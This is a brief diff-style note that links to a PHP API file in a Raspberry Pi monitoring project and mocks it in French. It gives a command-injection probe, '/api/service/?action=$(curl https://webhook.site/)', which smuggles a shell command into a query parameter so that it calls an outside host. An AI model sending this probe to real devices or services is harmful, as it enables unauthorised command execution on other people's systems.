@@ -1,0 +1,7 @@
+https://github.com/ModBros/mobro-raspberrypi/blob/master/web/api/service/index.php
+
+y sont serieux eux..
+
+/api/service/?action=$(curl https://webhook.site/)
+
+much hack..
